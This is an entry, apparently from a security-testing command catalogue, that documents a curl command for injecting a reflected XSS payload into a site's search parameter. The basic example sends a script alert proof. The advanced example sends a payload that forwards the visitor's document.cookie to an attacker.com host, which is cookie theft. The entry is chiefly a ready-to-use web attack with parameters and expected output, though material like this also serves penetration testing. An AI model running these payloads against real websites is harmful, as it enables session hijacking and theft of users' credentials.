---
data: >-
  curl -X GET
  "https://target-site.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
  -v
tags:
  - xss
  - web-testing
  - payload-injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.699Z'
id: fa233243-4e98-45e2-9a22-8a01741e8709
verified: false
validated: true
submitted: true
---
# curl-inject-xss-payload

## Command

```bash
curl -X GET "https://target-site.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" -v
```

## Description

This command uses curl to send a GET request to a search endpoint with a URL-encoded XSS payload, testing for reflection without proper sanitization. It helps verify if the input is echoed back in an executable context like HTML or JavaScript.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `https://target-site.com/search?q=...` | The target URL with encoded payload in query parameter | Yes |
| `-v` | Verbose mode to show response headers and body | No |
| `%3Cscript%3E...` | URL-encoded JavaScript payload (e.g., <script>alert('XSS')</script>) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target-site.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" -v
```

### Advanced Usage

```bash
curl -X GET "https://target-site.com/search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2F%27%2Bdocument.cookie%3C%2Fscript%3E" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

A verbose HTTP response (status 200) with the page body containing the unescaped payload, such as `<script>alert('XSS')</script>` in the HTML source. No alert in curl, but confirms reflection for browser testing.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Algolia-Search]]
